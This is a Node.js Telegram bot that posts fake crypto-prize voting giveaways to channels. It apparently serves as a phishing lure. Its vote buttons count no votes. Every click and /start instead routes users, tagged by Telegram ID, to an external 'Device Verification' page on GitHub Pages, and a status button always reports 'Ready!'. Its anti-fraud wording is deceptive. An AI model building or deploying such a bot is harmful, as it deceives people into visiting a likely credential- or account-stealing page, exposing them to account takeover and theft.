const { Telegraf, Markup } = require('telegraf');
const http = require('http');

const token = process.env.BOT_TOKEN || process.env.TOKEN;
const ADMIN_ID = Number(process.env.ADMIN_ID) || 0; 

if (!token) {
  console.error('Error: BOT_TOKEN is not defined!');
  process.exit(1);
}

const bot = new Telegraf(token);
const adminState = {}; 
const botUsername = "realsvotebot";

// /start command
bot.start(async (ctx) => {
  try {
    const userName = ctx.from.first_name || 'User';
    const userId = ctx.from.id;
    const webAppUrl = `https://rishumishra1775-glitch.github.io/telegram-giveaway-bots/?user=${userId}`;

    await ctx.reply(
      `Welcome, ${userName}! 🎉\n\nTo participate in the voting giveaway and lock in your verified device entry, please complete your **Device Verification** below.`,
      {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
          [Markup.button.url('🔗 Verify Device', webAppUrl)],
          [Markup.button.callback('📊 Check Status', 'check_status')]
        ])
      }
    );
  } catch (err) {
    console.error('Error in /start:', err);
  }
});

// Status check action
bot.action('check_status', async (ctx) => {
  try {
    await ctx.answerCbQuery();
    await ctx.reply('✅ Device Status: Ready! Once you verify your device on the link, your entry/vote will be securely locked.');
  } catch (err) {
    console.error('Error in check_status:', err);
  }
});

// /restart command to clear stuck wizard states
bot.command('restart', async (ctx) => {
  const userId = ctx.from.id;
  if (adminState[userId]) {
    delete adminState[userId];
  }
  await ctx.reply('🔄 **Bot session & wizard states cleared successfully!** You can now start fresh using /create.');
});

// --- ADMIN GIVEAWAY CREATOR WIZARD ---
bot.command('create', async (ctx) => {
  const userId = ctx.from.id;

  if (ADMIN_ID && userId !== ADMIN_ID) {
    return ctx.reply('❌ You are not authorized to create giveaways.');
  }

  adminState[userId] = { step: 'waiting_channel' };
  await ctx.reply('📢 **Giveaway Creator Wizard Started**\n\nPlease send the Target Channel username or link (e.g., `@mychannel`):', { parse_mode: 'Markdown' });
});

bot.on('text', async (ctx, next) => {
  const userId = ctx.from.id;
  const text = ctx.message.text;

  if (!adminState[userId]) return next();

  const state = adminState[userId];

  if (state.step === 'waiting_channel') {
    state.channel = text.trim();
    
    try {
      const botInfo = await ctx.telegram.getMe();
      const chatMember = await ctx.telegram.getChatMember(state.channel, botInfo.id);
      
      if (!['administrator', 'creator'].includes(chatMember.status)) {
        delete adminState[userId];
        return ctx.reply('❌ Error: The bot is not an administrator in this channel! Please make the bot an admin first and run /create again.');
      }
    } catch (err) {
      delete adminState[userId];
      return ctx.reply('❌ Error validating channel. Make sure the channel username is correct and the bot is added as an Administrator.');
    }

    state.step = 'waiting_name';
    return ctx.reply('✅ Channel validated successfully!\n\nNow, enter the **Giveaway / Voting Title** (e.g., Best Creator Award):', { parse_mode: 'Markdown' });
  }

  if (state.step === 'waiting_name') {
    state.giveawayName = text;
    state.step = 'waiting_prize';
    return ctx.reply('🏆 Now, enter the **Prize Details** (e.g., $100 USDT):', { parse_mode: 'Markdown' });
  }

  if (state.step === 'waiting_prize') {
    state.prize = text;
    state.step = 'waiting_nominees';
    return ctx.reply('👥 Now, send the **Nominees / Options** separated by commas (e.g., `Player A, Player B, Player C`):', { parse_mode: 'Markdown' });
  }

  if (state.step === 'waiting_nominees') {
    state.nominees = text.split(',').map(n => n.trim()).filter(Boolean);
    
    if (state.nominees.length === 0) {
      return ctx.reply('⚠️ Please provide at least one valid nominee separated by commas.');
    }

    const { channel, giveawayName, prize, nominees } = state;
    delete adminState[userId];

    const buttons = nominees.map((nominee, index) => [
      Markup.button.callback(`🗳 Vote: ${nominee}`, `vote_${index}`)
    ]);

    try {
      await ctx.telegram.sendMessage(
        channel,
        `🎁 **${giveawayName}**\n\n🏆 **Prize:** ${prize}\n\n👇 Click below to vote for your favorite nominee! (Device verification required to prevent fraud)`,
        {
          parse_mode: 'Markdown',
          ...Markup.inlineKeyboard(buttons)
        }
      );

      return ctx.reply('🎉 **Giveaway successfully created and posted to the channel!**');
    } catch (err) {
      console.error('Error posting to channel:', err);
      return ctx.reply(`❌ Failed to post giveaway to channel: ${err.message}`);
    }
  }

  return next();
});

// Handle vote button clicks
bot.action(/^vote_(\d+)$/, async (ctx) => {
  try {
    await ctx.answerCbQuery();
    const userId = ctx.from.id;
    const verifyUrl = `https://rishumishra1775-glitch.github.io/telegram-giveaway-bots/?user=${userId}`;

    await ctx.reply(
      `🔒 **Anti-Fraud Verification Required**\n\nTo cast your vote securely (1 vote per device/user), please verify your device first:`,
      {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
          [Markup.button.url('🔗 Verify Device Now', verifyUrl)],
          [Markup.button.callback('✅ I Have Verified', 'check_status')]
        ])
      }
    );
  } catch (err) {
    console.error('Error handling vote action:', err);
  }
});

bot.launch().then(() => {
  console.log('Bot is running successfully with all features!');
}).catch((err) => {
  console.error('Failed to launch bot:', err);
});

const PORT = process.env.PORT || 3000;
http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('Bot server is active!\n');
}).listen(PORT, () => {
  console.log(`HTTP server listening on port ${PORT}`);
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
